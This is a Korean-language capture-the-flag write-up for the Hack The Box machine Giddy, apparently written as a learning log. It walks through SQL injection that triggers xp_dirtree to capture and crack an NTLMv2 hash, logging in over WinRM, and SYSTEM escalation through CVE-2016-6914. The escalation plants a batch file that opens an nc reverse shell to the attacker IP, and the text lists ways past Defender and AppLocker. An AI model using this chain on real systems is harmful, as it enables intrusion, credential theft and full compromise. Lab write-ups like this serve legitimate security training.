# HTB Giddy Writeup

**OS:** Windows  
**Difficulty:** Medium  
**IP:** 10.129.96.140

---

## 정보 수집

### Nmap 포트 스캔

```bash
nmap -p- --min-rate 10000 -T4 10.129.96.140
```

**결과:**

|PORT|STATE|SERVICE|
|---|---|---|
|80/tcp|open|http|
|443/tcp|open|https|
|3389/tcp|open|ms-wbt-server (RDP)|
|5985/tcp|open|wsman (WinRM)|

> `-sS` 스캔에서 5985가 누락될 수 있으니 `-sT`로 재확인하거나 직접 지정 스캔

```bash
nmap -sV -p 80,443,3389,5985 10.129.96.140
```

---

## 웹 열거

### 디렉토리 스캔

```bash
gobuster dir -u http://10.129.96.140 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**발견된 경로:**

|경로|설명|
|---|---|
|`/remote`|PowerShell Web Access 포털|
|`/mvc`|ASP.NET 쇼핑몰 애플리케이션|

### 웹 서버 정보

- **IIS 버전:** Microsoft IIS 6.0 (틀림, 실제는 IIS 10)
- **프레임워크:** ASP.NET
- `/mvc/Product.aspx?ProductSubCategoryId=` → SQL 에러 발생 확인

---

## SQL Injection

### 취약점 발견

`/mvc/Product.aspx`의 `ProductSubCategoryId` 파라미터가 SQL Injection에 취약

브라우저에서 `'` 입력 시:

```
System.Data.SqlClient.SqlException: Incorrect syntax near '='
```

### Net-NTLMv2 해시 캡처 (xp_dirtree)

**1. Responder 실행 (Kali)**

```bash
responder -I tun0
```

**2. xp_dirtree로 SMB 연결 트리거 (브라우저)**

```
http://10.129.96.140/mvc/Product.aspx?ProductSubCategoryId=8;%20EXEC%20master..xp_dirtree%20%22\\10.10.17.240\test%22;%20--
```

**3. 캡처된 해시**

```
[SMB] NTLMv2-SSP Username : GIDDY\Stacy
[SMB] NTLMv2-SSP Hash     : Stacy::GIDDY:...
```

### 해시 크랙

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

**결과:** `Stacy:xNnWo6272k7x`

---

## 초기 침투 (Initial Foothold)

### WinRM으로 접속

```bash
evil-winrm -i 10.129.96.140 -u Stacy -p xNnWo6272k7x
```

### User Flag 획득

```powershell
type C:\Users\Stacy\Desktop\user.txt
```

---

## 권한 상승 (Privilege Escalation)

### 취약한 소프트웨어 발견

```powershell
ls C:\ProgramData
```

**`unifi-video`** 디렉토리 발견 → **CVE-2016-6914** (Ubiquiti UniFi Video 3.7.3)

### 취약점 원리

- UniFi Video 서비스가 시작/중지 시 `C:\ProgramData\unifi-video\taskkill.exe` 실행 시도
- 해당 파일이 기본적으로 존재하지 않음
- 해당 디렉토리에 Stacy 쓰기 권한 있음
- 서비스가 **NT AUTHORITY\SYSTEM**으로 실행됨

### PSReadLine 히스토리 확인

```powershell
type C:\Users\Stacy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

```
net stop unifivideoservice
Stop-Service -Name Unifivideoservice -Force
Get-Service -Name Unifivideoservice
```

### 익스플로잇

**Defender/AppLocker 우회 문제:**

- msfvenom 페이로드 → Defender 차단
- `New-Object`, `certutil` → Constrained Language Mode 차단
- AppLocker → `\windows\tasks\` 경로로 우회 가능

**1. Kali에서 nc.exe SMB 공유**

```bash
cp /usr/share/windows-resources/binaries/nc.exe /home/kali/
impacket-smbserver smb /home/kali -smb2support
```

**2. Kali에서 taskkill.bat 생성**

```bash
echo 'c:\windows\tasks\nc.exe -e cmd.exe 10.10.17.240 9001' > /home/kali/taskkill.bat
```

**3. evil-winrm에서 파일 복사**

```powershell
# nc.exe를 AppLocker 우회 경로에 복사
copy \\10.10.17.240\smb\nc.exe \windows\tasks\nc.exe

# taskkill.bat을 taskkill.exe로 복사
copy \\10.10.17.240\smb\taskkill.bat C:\ProgramData\unifi-video\taskkill.exe
```

**4. Kali에서 nc 리스너**

```bash
nc -nvlp 9001
```

**5. evil-winrm에서 서비스 중지**

```powershell
Stop-Service -Name Unifivideoservice -Force
```

**NT AUTHORITY\SYSTEM 획득!**

### Root Flag 획득

```
type C:\Users\Administrator\Desktop\root.txt
```

---

## 공격 흐름 요약

```
Nmap 스캔
  → /mvc 웹앱 발견
    → ProductSubCategoryId SQL Injection
      → xp_dirtree로 NTLMv2 해시 캡처 (Responder)
        → hashcat으로 크랙 → Stacy:xNnWo6272k7x
          → evil-winrm 접속 (포트 5985)
            → unifi-video CVE-2016-6914 발견
              → taskkill.bat → taskkill.exe로 위장
                → 서비스 중지 → SYSTEM 쉘 획득 🏆
```

---

## 핵심 명령어 정리

|목적|명령어|
|---|---|
|디렉토리 스캔|`gobuster dir -u http://<IP> -w <wordlist>`|
|NTLMv2 캡처|`responder -I tun0`|
|xp_dirtree 트리거|`ProductSubCategoryId=8; EXEC master..xp_dirtree '\\<IP>\test'; --`|
|해시 크랙|`hashcat -m 5600 hash.txt rockyou.txt`|
|WinRM 접속|`evil-winrm -i <IP> -u Stacy -p xNnWo6272k7x`|
|SMB 서버|`impacket-smbserver smb /home/kali -smb2support`|
|AppLocker 우회 경로|`C:\windows\tasks\`|

---

## 배운 점

- SQL Injection → xp_dirtree → NTLMv2 해시 캡처 → hashcat 크랙 흐름
- WinRM(5985)으로 evil-winrm 접속
- Windows Defender가 msfvenom 페이로드를 차단함
- Constrained Language Mode에서 `New-Object`, certutil 등 제한됨
- AppLocker 우회: `C:\windows\tasks\` 경로 사용
- `.bat` 파일을 `.exe`로 이름 바꿔서 Defender 우회 가능
- PSReadLine 히스토리(`ConsoleHost_history.txt`)로 이전 명령어 확인 가능
- CVE-2016-6914: UniFi Video 서비스가 SYSTEM으로 taskkill.exe 실행하는 취약점